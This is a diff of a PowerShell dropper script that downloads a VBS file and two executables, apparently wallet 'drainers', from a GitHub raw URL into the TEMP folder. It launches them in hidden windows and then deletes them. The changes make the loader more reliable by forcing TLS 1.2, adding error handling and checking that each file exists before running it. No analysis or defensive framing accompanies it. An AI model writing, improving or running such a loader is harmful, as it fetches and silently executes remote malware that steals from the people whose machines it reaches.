@@ -1,18 +1,25 @@
 $base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
-$vbs = "$env:TEMP\script.vbs"
-$d1 = "$env:TEMP\drainer.exe"
-$d2 = "$env:TEMP\StarDrainer.exe"
+$vbs = Join-Path $env:TEMP 'script.vbs'
+$d1  = Join-Path $env:TEMP 'drainer.exe'
+$d2  = Join-Path $env:TEMP 'StarDrainer.exe'
 
-(New-Object Net.WebClient).DownloadFile($base + 'script.vbs', $vbs)
-(New-Object Net.WebClient).DownloadFile($base + 'drainer.exe', $d1)
-(New-Object Net.WebClient).DownloadFile($base + 'StarDrainer.exe', $d2)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden
-Start-Process -FilePath $d1 -WindowStyle Hidden
-Start-Process -FilePath $d2 -WindowStyle Hidden
+try {
+    (New-Object Net.WebClient).DownloadFile($base + 'script.vbs', $vbs)
+    (New-Object Net.WebClient).DownloadFile($base + 'drainer.exe', $d1)
+    (New-Object Net.WebClient).DownloadFile($base + 'StarDrainer.exe', $d2)
+} catch {
+    Write-Host "download error: $($_.Exception.Message)"
+    return
+}
+
+if (Test-Path $vbs) { Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden }
+if (Test-Path $d1)  { Start-Process -FilePath $d1 -WindowStyle Hidden }
+if (Test-Path $d2)  { Start-Process -FilePath $d2 -WindowStyle Hidden }
 
 Start-Sleep -Seconds 3
 
 Remove-Item -Path $vbs -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $d1 -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $d2 -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $d1  -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $d2  -Force -ErrorAction SilentlyContinue
